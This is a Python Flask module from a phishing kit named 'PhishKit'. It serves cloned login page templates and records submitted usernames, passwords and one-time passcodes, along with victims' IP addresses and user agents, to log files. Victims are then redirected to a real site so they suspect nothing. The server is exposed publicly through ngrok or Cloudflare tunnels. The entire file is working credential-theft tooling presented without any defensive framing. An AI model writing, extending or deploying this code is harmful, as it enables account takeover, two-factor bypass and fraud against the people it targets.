"""
PhishKit — Web server module
"""

import os
import sys
import json
import threading
from flask import Flask, request, render_template_string, redirect, send_from_directory

app = Flask(__name__)
server_config = {}

TEMPLATES_DIR = os.path.join(os.path.dirname(os.path.dirname(__file__)), "templates")
OUTPUT_DIR = os.path.join(os.path.dirname(os.path.dirname(__file__)), "output")

@app.route("/")
def index():
    template_name = server_config["campaign"]["template"]
    template_path = os.path.join(TEMPLATES_DIR, template_name, "index.html")

    if not os.path.exists(template_path):
        return "Template not found", 404

    with open(template_path, "r") as f:
        html_content = f.read()

    return render_template_string(html_content)

@app.route("/login", methods=["POST"])
def login():
    data = request.form.to_dict()
    if not data:
        data = request.get_json(silent=True) or {}

    # Capture credentials
    if server_config["campaign"]["capture_credentials"]:
        capture_data(data)

    # Redirect to real site
    redirect_url = server_config["campaign"].get("redirect_url", "https://www.google.com")
    return redirect(redirect_url), 302

@app.route("/assets/<path:filename>")
def serve_assets(filename):
    template_name = server_config["campaign"]["template"]
    assets_dir = os.path.join(TEMPLATES_DIR, template_name, "assets")
    return send_from_directory(assets_dir, filename)

@app.route("/otp", methods=["POST"])
def otp():
    data = request.form.to_dict() or request.get_json(silent=True) or {}
    if server_config["campaign"].get("capture_otp", False):
        capture_data(data, log_type="otp")
    return {"status": "ok"}, 200

def capture_data(data, log_type="credentials"):
    """Log captured data to file."""
    from datetime import datetime
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    client_ip = request.remote_addr
    user_agent = request.headers.get("User-Agent", "Unknown")

    entry = {
        "timestamp": timestamp,
        "type": log_type,
        "ip": client_ip,
        "user_agent": user_agent,
        "data": data
    }

    template_name = server_config["campaign"]["template"]
    log_file = os.path.join(OUTPUT_DIR, f"{template_name}_captures.jsonl")

    with open(log_file, "a") as f:
        f.write(json.dumps(entry) + "\n")

    print(f"\n[+] {log_type.upper()} captured from {client_ip}")
    print(f"    Data: {data}")

    if server_config["campaign"].get("log_ips", False):
        ip_log = os.path.join(OUTPUT_DIR, "ips.txt")
        with open(ip_log, "a") as f:
            f.write(f"{timestamp} | {client_ip} | {user_agent}\n")

def run_server(config):
    global server_config
    server_config = config

    host = config["server"]["host"]
    port = config["server"]["port"]

    # Start tunnel if enabled
    if config["tunnel"]["enabled"]:
        start_tunnel(config, port)

    # Start Flask
    ssl_context = None
    if config["server"]["ssl"] and config["server"]["ssl_cert"] and config["server"]["ssl_key"]:
        ssl_context = (config["server"]["ssl_cert"], config["server"]["ssl_key"])

    app.run(host=host, port=port, ssl_context=ssl_context, debug=False)

def start_tunnel(config, local_port):
    provider = config["tunnel"]["provider"]
    
    def run_ngrok():
        try:
            from pyngrok import ngrok
            ngrok.set_auth_token(config["tunnel"]["ngrok_auth_token"])
            public_url = ngrok.connect(local_port)
            print(f"[+] ngrok tunnel: {public_url}")
        except Exception as e:
            print(f"[-] ngrok failed: {e}")

    def run_cloudflare():
        try:
            import cloudflare
            cf = cloudflare.Cloudflare(api_token=config["tunnel"]["cloudflare_api_token"])
            # Cloudflare tunnel setup via argo
            import subprocess
            subprocess.Popen(["cloudflared", "tunnel", "--url", f"http://localhost:{local_port}"])
            print(f"[+] Cloudflare tunnel starting on port {local_port}")
        except Exception as e:
            print(f"[-] Cloudflare tunnel failed: {e}")

    if provider == "ngrok":
        threading.Thread(target=run_ngrok, daemon=True).start()
    elif provider == "cloudflare":
        threading.Thread(target=run_cloudflare, daemon=True).start()
